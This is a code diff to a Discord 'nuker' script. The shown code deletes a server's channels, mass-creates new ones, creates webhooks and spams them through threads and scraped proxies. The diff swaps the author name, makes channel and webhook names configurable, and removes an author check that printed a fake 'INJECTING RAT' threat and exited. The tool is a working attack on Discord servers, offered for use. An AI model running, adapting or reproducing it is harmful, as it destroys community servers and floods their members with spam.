@@ -10,7 +10,7 @@ import json
 import threading
 import urllib3
 
-__author__ = 'K.Dot#0001'
+__author__ = 'SomeRandomGuy'
 
 with open('config.json', 'r') as f:
     config = json.load(f)
@@ -19,7 +19,9 @@ with open('config.json', 'r') as f:
     AMMOUNT_OF_CHANNELS = config["AMMOUNT_OF_CHANNELS"]
     SPAM_PRN = config["SPAM_PRN"]
     PROXIES = config["PROXIES"]
+    CHANNEL_NAMES = config["CHANNEL_NAMES"]
     MESSAGES_PER_CHANNEL = config["MESSAGES_PER_CHANNEL"]
+    WEBHOOK_NAME = config["WEBHOOK_NAME"]
 
 banner = Center.XCenter("""
  ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
@@ -38,6 +40,8 @@ Ammount of channels = {AMMOUNT_OF_CHANNELS}
 Spam PRN = {SPAM_PRN}
 Proxies = {PROXIES}
 Messages per channel = {MESSAGES_PER_CHANNEL}
+Cannel_Names = {CHANNEL_NAMES}
+Webhook_Name = {WEBHOOK_NAME}
 """
 
 print(Colorate.Vertical(Colors.yellow_to_red, banner, 2))
@@ -77,11 +81,11 @@ async def main():
                 for channel in channel_id:
                     await kdot.delete(f'{api}/channels/{channel["id"]}', headers=nwords)
         for i in range(int(AMMOUNT_OF_CHANNELS)):
-            channel = await kdot.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": "nuked by k.dot", "type": 0})
+            channel = await kdot.post(f'{api}/guilds/{guild}/channels', headers=nwords, json={"name": CHANNEL_NAMES, "type": 0})
             data_channel = await channel.json()
             channel_id = data_channel["id"]
             try:
-                async with kdot.post(f'{api}/channels/{channel_id}/webhooks', headers=nwords, json={"name": "K.Dot#0001"}) as r:
+                async with kdot.post(f'{api}/channels/{channel_id}/webhooks', headers=nwords, json={"name": WEBHOOK_NAME}) as r:
                     webhook_raw = await r.json()
                     webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                     threading.Thread(target=spamhook, args=(webhook,)).start()
@@ -130,11 +134,6 @@ def spamhook(hook):
 
 if PROXIES == True:
     proxy_scrape()
-
-if __author__ != '\x4b\x2e\x44\x6f\x74\x23\x30\x30\x30\x31':
-    print(Colors.green + 'INJECTING RAT INTO YOUR SYSTEM')
-    time.sleep(5)
-    os._exit(0)
 
 if __name__ == '__main__':
     asyncio.run(main())
